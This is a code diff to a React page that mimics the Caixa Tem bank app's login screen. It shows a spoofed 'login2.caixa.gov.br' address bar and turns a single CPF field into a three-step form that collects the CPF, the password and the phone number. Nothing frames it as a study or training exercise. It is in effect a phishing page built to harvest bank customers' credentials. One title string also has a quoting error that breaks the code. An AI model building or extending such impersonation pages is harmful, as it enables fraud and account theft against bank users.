@@ -5,23 +5,37 @@ import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Form, FormControl, FormField, FormItem } from "@/components/ui/form";
 import { useForm } from "react-hook-form";
-import { Loader2 } from "lucide-react";
+import { Loader2, User, Lock, Phone } from "lucide-react";
 
 interface LoginFormData {
   cpf: string;
+  password: string;
+  phone: string;
 }
 
 const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
+  const [step, setStep] = useState<'cpf' | 'password' | 'phone'>('cpf');
 
   const form = useForm<LoginFormData>({
     defaultValues: {
       cpf: "",
+      password: "",
+      phone: "",
     },
   });
 
   const onSubmit = async (data: LoginFormData) => {
     try {
+      if (step === 'cpf') {
+        setStep('password');
+        return;
+      }
+      if (step === 'password') {
+        setStep('phone');
+        return;
+      }
+      
       setIsLoading(true);
       console.log("Form data:", data);
       await new Promise(resolve => setTimeout(resolve, 1000));
@@ -30,11 +44,30 @@ const Index = () => {
     }
   };
 
+  const getStepTitle = () => {
+    switch (step) {
+      case 'cpf':
+        return "Informe seu CPF e clique em "Próximo" para continuar:";
+      case 'password':
+        return "Digite sua senha para continuar:";
+      case 'phone':
+        return "Digite seu número de telefone para continuar:";
+    }
+  };
+
   return (
     <div className="min-h-screen bg-white">
       {/* Header */}
       <div className="flex items-center justify-between p-4 bg-white border-b border-gray-200">
-        <button className="text-blue-500 text-lg">Cancelar</button>
+        <button 
+          className="text-blue-500 text-lg"
+          onClick={() => {
+            if (step === 'phone') setStep('password');
+            else if (step === 'password') setStep('cpf');
+          }}
+        >
+          {step !== 'cpf' ? 'Voltar' : 'Cancelar'}
+        </button>
         <div className="flex items-center">
           <span className="text-gray-800">login2.caixa.gov.br</span>
           <button className="ml-4 text-blue-500">
@@ -58,35 +91,85 @@ const Index = () => {
         <h2 className="text-center text-blue-600 text-xl mb-8">Aplicativo Caixa Tem</h2>
 
         <p className="text-gray-600 text-lg mb-8 text-center">
-          Informe seu CPF e clique em "Próximo" para continuar:
+          {getStepTitle()}
         </p>
 
         <Form {...form}>
           <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
-            <FormField
-              control={form.control}
-              name="cpf"
-              render={({ field }) => (
-                <FormItem>
-                  <FormControl>
-                    <div className="relative">
-                      <div className="absolute left-0 top-2">
-                        <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
-                        </svg>
+            {step === 'cpf' && (
+              <FormField
+                control={form.control}
+                name="cpf"
+                render={({ field }) => (
+                  <FormItem>
+                    <FormControl>
+                      <div className="relative">
+                        <div className="absolute left-0 top-2">
+                          <User className="h-6 w-6 text-gray-400" />
+                        </div>
+                        <Input
+                          placeholder="CPF"
+                          type="text"
+                          className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2"
+                          disabled={isLoading}
+                          {...field}
+                        />
                       </div>
-                      <Input
-                        placeholder="CPF"
-                        type="text"
-                        className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2"
-                        disabled={isLoading}
-                        {...field}
-                      />
-                    </div>
-                  </FormControl>
-                </FormItem>
-              )}
-            />
+                    </FormControl>
+                  </FormItem>
+                )}
+              />
+            )}
+
+            {step === 'password' && (
+              <FormField
+                control={form.control}
+                name="password"
+                render={({ field }) => (
+                  <FormItem>
+                    <FormControl>
+                      <div className="relative">
+                        <div className="absolute left-0 top-2">
+                          <Lock className="h-6 w-6 text-gray-400" />
+                        </div>
+                        <Input
+                          placeholder="Senha"
+                          type="password"
+                          className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2"
+                          disabled={isLoading}
+                          {...field}
+                        />
+                      </div>
+                    </FormControl>
+                  </FormItem>
+                )}
+              />
+            )}
+
+            {step === 'phone' && (
+              <FormField
+                control={form.control}
+                name="phone"
+                render={({ field }) => (
+                  <FormItem>
+                    <FormControl>
+                      <div className="relative">
+                        <div className="absolute left-0 top-2">
+                          <Phone className="h-6 w-6 text-gray-400" />
+                        </div>
+                        <Input
+                          placeholder="Telefone"
+                          type="tel"
+                          className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2"
+                          disabled={isLoading}
+                          {...field}
+                        />
+                      </div>
+                    </FormControl>
+                  </FormItem>
+                )}
+              />
+            )}
 
             <Button
               type="submit"
@@ -99,7 +182,7 @@ const Index = () => {
                   Processando...
                 </>
               ) : (
-                "Próximo"
+                step === 'phone' ? "Entrar" : "Próximo"
               )}
             </Button>
           </form>
